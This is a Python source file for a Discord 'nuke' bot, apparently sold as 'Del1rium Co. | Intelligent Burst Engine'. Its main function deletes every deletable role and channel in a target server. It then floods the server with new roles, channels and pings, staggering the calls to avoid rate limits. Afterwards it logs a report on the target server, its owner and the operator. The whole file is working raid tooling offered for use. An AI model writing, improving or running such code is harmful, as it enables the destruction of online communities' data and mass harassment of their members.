import discord
import asyncio
import aiohttp
import gc
from datetime import datetime
import worker

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# [ COORDINATION ENGINE - OPTIMIZED ]
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def start_nuke(ctx, bot, name, text, channels_count, pings_count, roles_count, role_name, premium, log_id, icon_url):
    guild = ctx.guild
    start_time = datetime.utcnow()
    
    # 1. Fast Destruction
    destruction = [
        *(role.delete() for role in guild.roles if not role.is_default() and not role.managed),
        *(channel.delete() for channel in guild.channels)
    ]
    await asyncio.gather(*destruction, return_exceptions=True)
    
    # 2. Intelligent Deployment
    deployment_tasks = []
    
    if premium: deployment_tasks.append(update_icon(guild, icon_url))
    deployment_tasks.append(worker.role_worker(guild, roles_count, role_name))
    
    pings_per_channel = pings_count // channels_count if channels_count > 0 else 0
    remaining = pings_count % channels_count if channels_count > 0 else 0
    
    # Launch channel workers with staggered start to avoid instant global rate limit
    for i in range(channels_count):
        extra = 1 if i < remaining else 0
        task = asyncio.create_task(worker.channel_worker(guild, name, text, i, pings_per_channel + extra, premium))
        deployment_tasks.append(task)
        # Staggered start (0.01s) is key for "Intelligent" speed
        await asyncio.sleep(0.01)
    
    if deployment_tasks:
        await asyncio.gather(*deployment_tasks, return_exceptions=True)
    
    # 3. Finalization & Cleanup
    await send_detailed_report(ctx, bot, premium, guild, channels_count, pings_count, log_id, start_time)
    await perform_cleanup()

async def update_icon(guild, url):
    try:
        async with aiohttp.ClientSession() as session, session.get(url) as resp:
            if resp.status == 200: await guild.edit(icon=await resp.read())
    except: pass

async def perform_cleanup():
    gc.collect()
    await asyncio.sleep(0.1)

async def send_detailed_report(ctx, bot, premium, guild, channels, pings, log_id, start_time):
    log_channel = bot.get_channel(log_id)
    if not log_channel: return
    
    end_time = datetime.utcnow()
    duration = (end_time - start_time).total_seconds()
    type_str = "PREMIUM" if premium else "STANDARD"
    
    embed = discord.Embed(title="DETAILED OPERATION REPORT / REPORTE DETALLADO", color=0x2b2d31, timestamp=datetime.utcnow())
    
    server_info = (
        f"**Name / Nombre:** {guild.name}\n"
        f"**ID:** `{guild.id}`\n"
        f"**Owner / Dueno:** {guild.owner.mention} `({guild.owner.id})`\n"
        f"**Boost Level / Nivel:** {guild.premium_tier}\n"
        f"**Members / Miembros:** {guild.member_count}"
    )
    embed.add_field(name="TARGET INFORMATION / INFORMACION DEL OBJETIVO", value=server_info, inline=False)
    
    exec_info = (
        f"**Operator / Operador:** {ctx.author.mention}\n"
        f"**Type / Tipo:** `{type_str}`\n"
        f"**Duration / Duracion:** `{duration:.2f}s`"
    )
    embed.add_field(name="EXECUTION DETAILS / DETALLES DE EJECUCION", value=exec_info, inline=True)
    
    stats_info = (
        f"**Channels / Canales:** {channels}\n"
        f"**Total Pings:** {pings}\n"
        f"**Status / Estado:** Completed & Cleaned / Finalizado y Limpio"
    )
    embed.add_field(name="STATISTICS / ESTADISTICAS", value=stats_info, inline=True)
    
    if guild.icon: embed.set_thumbnail(url=guild.icon.url)
    embed.set_footer(text="Del1rium Co. | Intelligent Burst Engine")
    
    try: await log_channel.send(embed=embed)
    except: pass
